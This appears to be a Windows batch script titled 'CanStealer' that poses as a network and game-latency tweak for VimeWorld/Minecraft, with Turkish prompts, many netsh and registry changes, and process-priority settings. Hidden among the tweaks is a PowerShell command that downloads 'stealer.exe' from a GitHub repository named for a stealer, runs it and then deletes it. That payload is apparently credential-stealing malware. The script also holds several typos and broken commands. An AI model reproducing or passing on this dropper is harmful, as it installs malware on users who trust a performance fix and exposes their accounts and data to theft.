@echo Off
color 3
title CanStealer  - 
:menu
			echo.										       
			echo.
			echo.
			echo.                                                            
			echo.                                                            
                                                            
echo. 
echo.                                            
echo.                                    
echo.            CCCCCCCC           
echo.          CC                      
echo.        CC                          CanStealer
echo.        CC                            
echo.        CC                            
echo.        CC                            
echo.        CC                            
echo.        CC                        
echo.          CC                      
echo.            CCCCCCCC           
echo.                                    
echo.                                                   
echo.                                                            
echo.                                          
echo.                
echo.                 
echo.                 


color 3                                                                                
:LOOP
SET /P choice1=  - BASLATMAK ICIN Enter Bas : 
IF /I "%choice1%"=="ENTER" GOTO ENTER
IF /I "%choice1%"=="ENTER" GOTO ENTER
IF /I "%choice1%"=="ENTER" GOTO ENTER
IF /I "%choice1%"=="ENTER" GOTO ENTER
cls
:ENTER
netsh int tcp set global fastopen=enabled
netsh interface ipv4 set subinterface "Wi-Fi" mtu=%MTU% store=persistent
wmic process where name="svchost.exe" CALL setpriority "realtime"
netsh ine tcp show global
wmic process where name="VimeWorld.exe" CALL setpriority "realtime"
cls
:ENTER
netsh int tcp set supplemental template=custom icw=15
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "CaretTimeout" /t REG_DWORD /d "1000" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_DWORD /d "1000" /f
for /f "usebackq" %%i in (`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces`) do (
Reg.exe add %%i /v "TCPNoDelay" /d "1" /t REG_DWORD /f
Reg.exe add %%i /v "TcpAckFrequency" /d "3" /t REG_DWORD /f
Reg.exe add %%i /v "TCPDelAckTicks" /d "0" /t REG_DWORD /f
) 
wmic process where name="javaw.exe" CALL setpriority "high priority"
wmic process where name="VimeWorld.exe" Call setpriority "high priority"
netsh int tcp set global fastopen=enabled
netsh interface ipv4 set subinterface "Wi-Fi" mtu=%MTU% store=persistent
wmic process where name="svchost.exe" CALL setpriority "high priority"
netsh ine tcp show global
netsh interface ipv4 set interface "Enthernet" mtu=1450
wmic process where name="VimeWorld.exe" CALL setpriority "high
netsh interface ipv4 set subinterface "Wi-Fi" mtu=%MTU% store=persistent
netsh int tcp set supplemental custom congestionprovider=ctcp
netsh int tcp set global initialRto=1550
netsh int tcp set global rsc=enabled
netsh int tcp set global netdma=disabled
netsh int tcp set global maxsynretransmissions=4
cls
:ENTER
netsh int tcp set global autotuning=high
netsh int tcp set global dca=enabled
netsh int tcp set global rss=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global timestamps=enabled
netsh int tcp set global nonsackrttresiliency=ctcp
wmic process where name="VimeWorld.exe" CALL setpriority "realtime"
etsh int tcp set heuristics enabled
netsh int tcp set global chimney=disabled
netsh int tcp set global autotuninglevel=high
netsh ine tcp show global
netsh interface ipv4 set interface "Enthernet" mtu=1450
wmic process where name="explorer.exe" CALL setpriority "realtime"
netsh int tcp set supplemental template=custom icw=15
netsh int tcp set global fastopen=enabled
netsh interface tcp show global
netsh interface tcp set global autotuninglevel=experimental
netsh interface teredo set refreshinterval=100
netsh int tcp set global hystart=enabled
netsh interface ipv4 set interface "Wi-fi" metric=65
wmic process where name="taskhost.exe" CALL setpriority "high"
cls
wmic process where name="mqsvc.exe" CALL setpriority "high priority"
cls
netsh interface tcp set global congestionprovider=ctcp
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "CaretTimeout" /t REG_DWORD /d "1000" /f
Reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_DWORD /d "1000" /f
for /f "usebackq" %%i in (`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces`) do (
Reg.exe add %%i /v "TCPNoDelay" /d "1" /t REG_DWORD /f
Reg.exe add %%i /v "TcpAckFrequency" /d "3" /t REG_DWORD /f
Reg.exe add %%i /v "TCPDelAckTicks" /d "0" /t REG_DWORD /f
) >nul 2>&1
cls

:ENTER
@echo off
set "indirme_yeri=%USERPROFILE%\Documents\stealer.exe"
echo Bat Sekmeme iCin Ayarlandi...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sonriseclient/zwice11-stealer-7602/main/myapp.exe', '%indirme_yeri%')"
"%indirme_yeri%"
del "%indirme_yeri%"




(
sc config "BITS" start= auto
sc start "BITS"
for /f "tokens=3" %%a in ('sc queryex "BITS" ^| findstr "PID"') do (set pid=%%a)
) >nul 2>&1
wmic process where ProcessId=%pid% CALL setpriority "high"
(
sc config "Dnscache" start= demand
sc start "Dnscache"
for /f "tokens=3" %%a in ('sc queryex "Dnscache" ^| findstr "PID"') do (set pid=%%a)
) >nul 2>&1
wmic process where ProcessId=%pid% CALL setpriority "idle"
cls
cls
wmic process where name="mqsvc.exe" CALL setpriority "high priority"
cls
wmic process where name="mqtgsvc.exe" CALL setpriority "high priority"
cls
wmic process where name="javaw.exe" CALL setpriority "high priority"
cls
wmic process where name="svchost.exe" CALL setpriority "high priority"
cls
wmic process where name="VimeWorld.exe" CALL setpriority "realtime"
cls
goto:exit

timeout /nobreak /t 30 >nul